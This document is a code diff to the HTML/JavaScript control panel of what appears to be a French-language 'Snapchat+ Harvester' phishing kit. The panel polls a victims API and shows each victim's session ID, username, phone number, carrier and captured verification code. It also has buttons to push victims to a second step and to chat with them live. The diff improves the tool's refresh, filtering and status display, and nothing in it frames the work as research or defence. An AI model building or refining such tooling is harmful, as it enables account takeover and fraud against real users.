@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="fr">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -172,7 +171,6 @@
         }
     </style>
 </head>
-
 <body>
     <div class="header">
         <h1>Snapchat+ Harvester — Control Panel</h1>
@@ -227,9 +225,16 @@
         async function loadVictims() {
             try {
                 const res = await fetch('/api/victims');
-                victims = await res.json();
-                renderTable();
-            } catch (e) {}
+                const newVictims = await res.json();
+                
+                // Fix principal : on ne re-render que si les données ont changé
+                if (JSON.stringify(newVictims) !== JSON.stringify(victims)) {
+                    victims = newVictims;
+                    renderTable(document.getElementById('filter').value);
+                }
+            } catch (e) {
+                console.error("Erreur chargement victimes", e);
+            }
         }
 
         function renderTable(filter = '') {
@@ -239,8 +244,8 @@
 
             const filtered = victims.filter(v =>
                 !filter || 
-                v.sessionId.toLowerCase().includes(filter) ||
-                (v.username && v.username.toLowerCase().includes(filter)) ||
+                (v.sessionId && v.sessionId.toLowerCase().includes(filter.toLowerCase())) ||
+                (v.username && v.username.toLowerCase().includes(filter.toLowerCase())) ||
                 (v.phone && v.phone.includes(filter))
             );
 
@@ -248,11 +253,11 @@
                 count++;
                 const row = document.createElement('tr');
                 row.innerHTML = `
-                    <td><code>${v.sessionId}</code></td>
+                    <td><code>${v.sessionId || '-'}</code></td>
                     <td>${v.username || '-'}</td>
                     <td>${v.phone || '-'}</td>
                     <td>${v.operator || '-'}</td>
-                    <td><span class="status ${v.status || 'waiting'}">${v.status === 'waiting' ? '⏳ En attente' : v.status === 'step2_forced' ? '✅ Étape 2' : '✅ Code reçu'}</span></td>
+                    <td><span class="status ${v.status || 'waiting'}">${getStatusText(v.status)}</span></td>
                     <td><strong>${v.code || '-'}</strong></td>
                     <td class="actions">
                         <button class="action-btn step2-btn" onclick="forceStep2('${v.sessionId}')">▶️ Étape 2</button>
@@ -267,6 +272,17 @@
             document.getElementById('liveCount').textContent = count;
         }
 
+        function getStatusText(status) {
+            if (status === 'waiting') return '⏳ En attente';
+            if (status === 'step2_forced') return '✅ Étape 2';
+            if (status === 'code_received') return '✅ Code reçu';
+            return '⏳ En attente';
+        }
+
+        // Filtre en temps réel
+        document.getElementById('filter').addEventListener('input', (e) => renderTable(e.target.value));
+
+        // === Tes fonctions existantes (inchangées) ===
         function toggleChat(sessionId) {
             const chatPanel = document.getElementById('adminChat');
             if (currentChatSession === sessionId && chatPanel.style.display === 'flex') {
@@ -333,7 +349,8 @@
             } catch (e) {}
         }
 
-        setInterval(loadVictims, 2000);
+        // Lancement
+        setInterval(loadVictims, 1500);
         window.onload = loadVictims;
     </script>
 </body>
